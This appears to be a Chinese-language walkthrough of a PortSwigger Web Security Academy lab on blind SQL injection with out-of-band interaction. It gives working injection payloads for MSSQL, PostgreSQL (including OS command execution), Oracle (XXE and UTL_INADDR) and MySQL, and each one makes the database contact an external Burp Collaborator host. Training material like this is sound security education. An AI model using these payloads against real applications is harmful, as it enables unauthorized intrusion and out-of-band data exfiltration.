# 实验：具有带外交互的盲注 SQL 注入

本实验包含一个盲注 SQL 注入漏洞。应用程序使用跟踪 Cookie 进行分析，并执行包含所提交 Cookie 值的 SQL 查询。

SQL 查询是异步执行的，对应用程序的响应没有影响。但是，你可以触发与外部域名的带外交互。

为了解决本实验，请利用 SQL 注入漏洞向 Burp Collaborator 发起 DNS 查询。

> **注意**
> 为了防止学院平台被用于攻击第三方，我们的防火墙会阻止实验室与任意外部系统之间的交互。为了解决本实验，你必须使用 Burp Collaborator 的默认公共服务器。

> **提示**
> 你可以在我们的 [SQL 注入速查表](https://portswigger.net/web-security/sql-injection/cheat-sheet) 中找到一些有用的 Payload。

## 步骤

探测
- 访问登录页面
    ```http
    GET /login HTTP/2
    Cookie: TrackingId=MUc5FMgNaSSrK8dU; session=rUmqsUTYGp1dr3LEnjLg2NsH1FGrxnGh
    ```

- 尝试经典的1/2个单引号的字符串型注入
    - 无差异

尝试带外
- Microsoft
    ```sql
    $input=''; exec master..xp_dirtree '//l3prdtzf4a8qk74weyt1865hv81zpvdk.oastify.com/a' --
    ```

- PostgreSQL
    ```sql
    $input=''; COPY (SELECT '') to program 'nslookup devjola7f2jivzfopq4tjyg960cr0mob.oastify.com' --
    ```

- Oracle

    ```sql
    $input='' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://2cf8ma8wdrh7toddnf2ihney4pagyamz.oastify.com/"> %remote;]>'),'/l') FROM dual) --

    $input='' || (SELECT UTL_INADDR.get_host_address('re9xozalfgjwvdf2p447jcgn6ec502or.oastify.com') FROM dual)--
    ```
    - 得到 DNS 请求

- MySQL

    ```sql
    $input='' AND LOAD_FILE('\\\\b6ihgj2570bgnx7mhowrbw87yy4psig7.oastify.com\\a')-- 

    $input=''; SELECT 'foo' INTO OUTFILE '\\\\0jk6t8fukpo50mkbud9gollwbnhe56tv.oastify.com\\a'-- 
    ```
